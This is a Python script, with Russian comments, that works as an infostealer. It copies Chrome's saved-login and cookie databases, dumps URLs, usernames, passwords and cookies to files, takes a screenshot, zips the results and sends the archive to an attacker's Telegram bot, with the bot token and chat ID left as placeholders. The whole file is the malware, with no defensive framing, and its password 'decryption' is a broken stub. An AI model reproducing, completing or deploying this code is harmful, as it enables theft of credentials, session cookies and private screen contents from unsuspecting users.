import os
import sqlite3
import shutil
import base64
import zipfile
from PIL import ImageGrab
import telebot
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Telegram bot setup
token_bot = "ТОКЕН ВАШЕГО БОТА"
chat_id = "ВАШ CHAT_ID"
bot_telega = telebot.TeleBot(token_bot)

username = os.getlogin()

# Функция для расшифровки данных
def decrypt_password(encrypted_password):
    try:
        return encrypted_password.decode('utf-8')  # Попробуем расшифровать напрямую
    except Exception:
        return 'Невозможно расшифровать'

# Функция для работы с SQLite базой и извлечения данных
def fetch_data_from_db(db_path, query):
    try:
        shutil.copy2(db_path, db_path + '2')
        conn = sqlite3.connect(db_path + '2')
        cursor = conn.cursor()
        cursor.execute(query)
        return cursor.fetchall()
    except Exception as e:
        return []
    finally:
        if conn:
            conn.close()

# Универсальная функция для сохранения данных
def save_to_file(filename, data):
    with open(os.path.join(os.getenv("APPDATA"), filename), "w+") as file:
        file.write(data + '\n')

# Chrome passwords extraction
def chrome_passwords():
    text = "\nPasswords Chrome: \nURL | LOGIN | PASSWORD:\n"
    db_path = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
    if os.path.exists(db_path):
        results = fetch_data_from_db(db_path, 'SELECT action_url, username_value, password_value FROM logins')
        for result in results:
            url, login, encrypted_password = result
            password = decrypt_password(encrypted_password)
            text += f'{url} | {login} | {password}\n'
    return text

# Сохранение паролей Chrome
save_to_file('google_pass.txt', chrome_passwords())

# Аналогичные функции для кук и других браузеров
def chrome_cookies():
    text = "\nCookies Chrome: \nURL | COOKIE | COOKIE NAME\n"
    db_path = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'
    if os.path.exists(db_path):
        results = fetch_data_from_db(db_path, 'SELECT host_key, name, encrypted_value FROM cookies')
        for result in results:
            url, name, encrypted_cookie = result
            cookie = decrypt_password(encrypted_cookie)
            text += f'{url} | {cookie} | {name}\n'
    return text

# Сохранение кук Chrome
save_to_file('google_cookies.txt', chrome_cookies())

# Функция для создания архива
def create_zip():
    zname = 'E:\\LOG.zip'
    with zipfile.ZipFile(zname, 'w') as newzip:
        files_to_add = [
            'google_pass.txt', 'google_cookies.txt',
            'screenshot.jpg'
        ]
        for file in files_to_add:
            newzip.write(os.path.join(os.getenv("APPDATA"), file))
    return zname

# Создание скриншота
def take_screenshot():
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\screenshot.jpg')

# Отправка через Telegram
def send_to_telegram(zip_file):
    with open(zip_file, 'rb') as log_file:
        bot_telega.send_document(chat_id, log_file)

# Основная логика
if __name__ == "__main__":
    take_screenshot()
    zip_file = create_zip()
    send_to_telegram(zip_file)
